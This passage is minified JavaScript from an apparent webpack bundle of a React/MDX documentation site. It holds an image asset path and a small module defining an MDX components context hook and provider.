s=r.p+"assets/images/image-20211116103620097-7e04cdf96d8fe1d183bfcd523b63a1b5.png"},28453:(e,n,r)=>{r.d(n,{R:()=>p,x:()=>t});var s=r(96540);const i={},l=s.createContext(i);function p(e){const n=s.useContext(l);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:p(e.components),s.createElement(l.Provider,{value:n},e.children)}}}]);